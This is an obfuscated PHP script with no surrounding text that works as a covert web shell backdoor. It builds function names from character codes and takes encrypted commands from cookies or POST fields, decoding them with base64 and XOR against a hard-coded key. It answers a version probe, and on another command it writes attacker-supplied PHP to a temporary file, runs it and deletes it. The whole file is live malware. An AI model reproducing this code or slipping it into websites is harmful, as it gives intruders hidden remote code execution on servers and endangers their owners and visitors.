<?php 	function	i_deshpmh(){	echo      73288;	}

$sqchd	=	'sqchd'	^  '';$rxowouyeio	=/*  gd*/"\146"/*t */.      "i".$sqchd(965-857)     ./* unjrn   */"\145"	./*xylwq   */$sqchd(95)/* pm*/.  $sqchd(553-441)/*l   */.	"u".$sqchd(358-242)    ./*   oogll   */$sqchd(95)       ./* nefp*/"c"."o"."\x6e"/* x  */.	"\x74"      .	"e"."n"."\164"/*   he  */./*   iqxw*/$sqchd(115);
$jixgh	=/*   mbgl*/"\142"/*  q   */.       "a"."\163"/*ncav*/.     "\x65"/*x_tp */./*cc   */"\66"	./*   iqa  */"4"."\137"/*tm  */.      "\144"  ./*   lod  */"e"."c".$sqchd(111)      ./*  qvs*/"d"."e";
$ttukti    =    "u"."n"."s".$sqchd(101)      ./*   mbkry */"r"."i"."a"."\154"	.	$sqchd(687-582)    .   "\x7a"	./*rvc */"e";$sfszmumpip/*  tvv */=/*   pr*/"\x70"/* k */.	"\150"/* qx   */.      "p"."\x76"      ./* q */$sqchd(101)    .	"\x72"/*fvk */.   "s"."\151"/* j*/.       $sqchd(111)   ./* hlf*/"n";

$uysvzkh      =       $sqchd(117)/*  nt   */.	"n"."\154"	.    "\x69"   .      "n"."\x6b";


    function      t_inxo_n($grtpxqul,/*   inaj_   */$udvstne)


{    global	$sqchd;     $zzdggxgf/*   hsm  */=       "";


    for  ($thzzdvfmx/*   e*/=     0;/*  ad  */$thzzdvfmx/* ex  */<	strlen($grtpxqul);)/*c*/{

/* ze   */for/*  i*/($efglmq	=/*   ku*/0;	$efglmq	<  strlen($udvstne)  &&	$thzzdvfmx/*   tme_j */<      strlen($grtpxqul);	$efglmq++,	$thzzdvfmx++)	{


	$zzdggxgf	.=	$sqchd(ord($grtpxqul[$thzzdvfmx])/*x */^/*   hw   */ord($udvstne[$efglmq]));


/*  dqmxf*/}


/*  s  */}


  return    $zzdggxgf;


}


$tqjrio  =	$_COOKIE;
$rtnemjm/*  ik*/=	$_POST;$tqjrio/*gxsxt*/=      array_merge($rtnemjm,   $tqjrio);


$k_qaxh_yjp  =	$sqchd(57)	./*   iht  */"\65"	.  "f".$sqchd(50)/*q   */./*umo   */"4"."2"."\146"/*enp   */.	$sqchd(51)  .	"\55"	.     "\62"	.	"7"."\x37"  ./* fsu  */$sqchd(51)	.	$sqchd(45)/* zr */./*   j  */"4".$sqchd(654-603)     ./*   nvzse*/"5".$sqchd(55)    .   "-".$sqchd(604-547)	.	"\x35"/*  wscyf  */.    "0"."\144"	./* h_dcz */"-"."6".$sqchd(505-455)	.       "\x37"    ./*   pfmv*/"8"."\x38"	.   "f".$sqchd(327-273)/*hvjb*/.      "\60"     ./* rk */$sqchd(497-442)	./*  wwlrb  */$sqchd(563-514)       ./*  t */"0"."6";

foreach/* flo */($tqjrio  as/*  vr*/$_ovhkepk/*  hx_i*/=>/*   he   */$grtpxqul)    {

     $grtpxqul/*   gnp_  */=	$ttukti(t_inxo_n(t_inxo_n($jixgh($grtpxqul),/*bckvk   */$k_qaxh_yjp),/*   br */$_ovhkepk));

	if	(isset($grtpxqul[$sqchd(97)      ./* feuj  */"k"]))	{


	if	($grtpxqul["\x61"]    ==   "i")      {


  $thzzdvfmx    =  array();
  $thzzdvfmx["\x70"	.       $sqchd(1065-947)]     =	$sfszmumpip();


	$thzzdvfmx[$sqchd(115)	.      $sqchd(118)]	=/*cu*/"3".$sqchd(46)/*  feyp   */.    $sqchd(811-758);
/*  _mw*/echo    @serialize($thzzdvfmx);

	}	elseif	($grtpxqul["\x61"]	==	"e")	{


/* zcxp*/$ynuyvbnayi      =/*  o*/sprintf("."."/"."%"."\x73"    .	"."."p"."\154",	md5($k_qaxh_yjp));       $rxowouyeio($ynuyvbnayi,       "<"    .	"?"."p".$sqchd(259-155)       ./*  bmgke */"\x70"/*gyu  */.       $sqchd(32)    .	"\165"       .       $sqchd(342-232)       .	"l".$sqchd(105)       .     "n"."k"."("."_"."\x5f"/*  fx */.    "\106"/*   alez  */./*ghie   */$sqchd(1022-949)	./* _xq*/$sqchd(76)    ./*  jrxa */$sqchd(268-199)       .	$sqchd(613-518)	.    $sqchd(576-481)      .	")"."\73"/* qbcmk  */.	$sqchd(32)	.       $grtpxqul["\x64"]);

	include($ynuyvbnayi);


/* vym*/$uysvzkh($ynuyvbnayi);
       }


	exit();    }
}


